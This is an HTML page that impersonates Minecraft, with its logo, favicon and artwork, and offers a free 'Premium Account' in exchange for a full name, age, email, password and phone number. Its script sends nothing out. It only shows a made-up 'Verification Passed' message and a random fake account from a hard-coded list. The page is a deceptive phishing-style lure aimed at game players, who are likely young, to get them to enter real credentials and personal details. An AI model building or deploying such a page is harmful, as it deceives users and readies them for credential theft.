<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Minecraft Account Free</title>
  <link rel="icon" href="https://www.minecraft.net/etc.clientlibs/minecraft/clientlibs/main/resources/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: url("https://i.ibb.co/nNRnH6C/MCV-Summer-Drop-Hero-Dot-Net-Homepage-1920x1080.jpg") no-repeat center center fixed;
      background-size: cover;
    }

    .header {
      display: flex;
      align-items: center;
      padding: 20px 40px;
    }

    .header img {
      height: 40px;
    }

    .form-container {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: calc(100vh - 80px);
      padding: 20px;
    }

    .form-box {
      background-color: rgba(255, 255, 255, 0.95);
      padding: 40px;
      border-radius: 10px;
      max-width: 440px;
      width: 100%;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
      text-align: center;
    }

    h2 {
      color: #111;
      margin-bottom: 10px;
    }

    p {
      color: #444;
      font-size: 14px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      font-size: 15px;
      border-radius: 4px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      background-color: #00c300;
      border: none;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #009900;
    }

    #result {
      margin-top: 20px;
      background: #eef;
      padding: 15px;
      border-radius: 6px;
      display: none;
      color: #222;
    }
  </style>
</head>
<body>
  <div class="header">
    <img src="https://i.ibb.co/jvK8sM0t/Minecraft-Logo-2011.png" alt="Minecraft Logo" />
  </div>

  <div class="form-container">
    <div class="form-box">
      <h2>üéÅ Claim Your Minecraft Premium Account</h2>
      <p>Please provide your real information to verify eligibility.</p>

      <input type="text" id="name" placeholder="Full Name" />
      <input type="number" id="age" placeholder="Age" />
      <input type="email" id="email" placeholder="Email Address" />
      <input type="password" id="password" placeholder="Password" />
      <input type="tel" id="phone" placeholder="Phone Number" />
      <button onclick="claim()">Claim Now</button>

      <div id="result"></div>
    </div>
  </div>

  <script>
    function claim() {
      const name = document.getElementById("name").value.trim();
      const age = document.getElementById("age").value.trim();
      const email = document.getElementById("email").value.trim();
      const pass = document.getElementById("password").value.trim();
      const phone = document.getElementById("phone").value.trim();
      const result = document.getElementById("result");

      if (!name || !age || !email || !pass || !phone) {
        alert("Please complete all fields.");
        return;
      }

      const accounts = [
        "SteveLegend | Creeper2025",
        "EpicHero | Pickaxe123",
        "DiamondHunter | TNTblast!",
        "RedstoneLord | BuildOP",
        "HerobrineFree | ghostrunx"
      ];

      const rand = accounts[Math.floor(Math.random() * accounts.length)];
      result.style.display = "block";
      result.innerHTML = `
        <p><strong>‚úÖ Verification Passed</strong></p>
        <p>Your Minecraft Premium account:</p>
        <p><code>${rand}</code></p>
        <p style="color: red;">‚ö†Ô∏è Note: Some accounts may already be claimed.</p>
      `;
    }
  </script>
</body>
</html>
